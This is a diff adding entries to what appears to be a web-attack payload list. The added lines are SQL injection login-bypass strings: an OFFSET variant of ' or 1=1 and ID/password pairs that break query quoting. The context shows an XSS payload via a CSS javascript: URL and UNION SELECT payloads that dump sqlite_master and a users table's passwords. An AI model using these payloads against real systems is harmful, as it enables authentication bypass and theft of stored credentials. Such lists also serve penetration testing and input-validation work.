@@ -64,6 +64,14 @@ background-color:#f00;background:url("javascript:alert(document.domain);");
 ' or 1=1;#
 ' or '1
 
+* offset
+' or 1=1 offset 1;--
+
+ID: \
+PW: OR 1--
+ID: ' ||
+PW: OR 1--
+
 * union
 ' or 1=1 union select sql,1,1 from sqlite_master;--
 ' or 1=1 union select password, name, 1 from users_hogefuga;--
